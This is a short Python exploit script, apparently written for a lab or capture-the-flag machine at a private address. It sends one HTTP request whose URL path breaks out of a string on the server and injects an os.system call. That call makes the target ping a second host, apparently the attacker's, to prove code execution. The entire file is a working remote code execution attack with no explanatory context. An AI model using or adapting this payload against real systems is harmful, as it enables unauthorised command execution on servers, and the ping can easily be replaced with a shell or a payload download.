#!/usr/bin/python3

import requests
import sys

target = 'http://10.10.10.168:8080/'

payload = "'; __import__('os').system('ping -c 1 10.10.14.9'); a = '"

requests.get(target + payload)
